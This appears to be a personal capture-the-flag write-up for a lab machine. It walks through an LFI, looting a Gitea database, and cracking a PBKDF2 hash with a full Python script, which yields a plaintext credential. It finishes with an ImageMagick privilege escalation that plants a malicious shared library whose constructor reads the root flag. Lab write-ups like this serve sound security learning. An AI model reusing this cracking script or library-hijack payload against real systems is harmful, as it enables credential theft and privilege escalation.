we submit this form
![[Pasted image 20250216131144.png]]
and get link with redirect
![[Pasted image 20250216131159.png]]
that parameter is vulnerable to LFI
![[Pasted image 20250216131223.png]]
we also found new subdomain
![[Pasted image 20250216134036.png]]
there we found interesting directories
![[Pasted image 20250216134208.png]]
![[Pasted image 20250216134516.png]]
![[Pasted image 20250216134536.png]]
gitea db 
![[Pasted image 20250216143545.png]]
![[Pasted image 20250216143559.png]]
we use pyscript to crack it
import hashlib
import binascii
from pwn import log

salt  = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')  # 16 bytes
key   = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
dklen = 50
iterations = 50000


def hash(password, salt, iterations, dklen):
    hashValue = hashlib.pbkdf2_hmac(
        hash_name='sha256', 
        password=password, 
        salt=salt, 
        iterations=iterations, 
        dklen=dklen,
        )
    return hashValue


dict = '/home/kali/Downloads/rockyou.txt'
bar  = log.progress('Cracking PBKDF2')

with open(dict, 'r', encoding='utf-8') as f:
    for line in f:
        password  = line.strip().encode('utf-8') 
        hashValue = hash(password, salt, iterations, dklen)
        target    = binascii.unhexlify(key)
        # log.info(f'Our target is: {target}')
        bar.status(f'Trying: {password}, hash: {hashValue}')
        if hashValue == target:
            bar.success(f'Found password: {password}!')
            break
        
    bar.failure('Hash is not crackable.')

![[Pasted image 20250216162351.png]]
developer:25282528

in /opt/scripts we found 1 script
![[Pasted image 20250217110213.png]]
magick version
![[Pasted image 20250217110257.png]]
this version has vulnerability
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

cd /opt/app/static/assets/images

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/rootflag");
    exit(0);
}
EOF

cp home.jpg home2.jpg

we get flag in /tmp
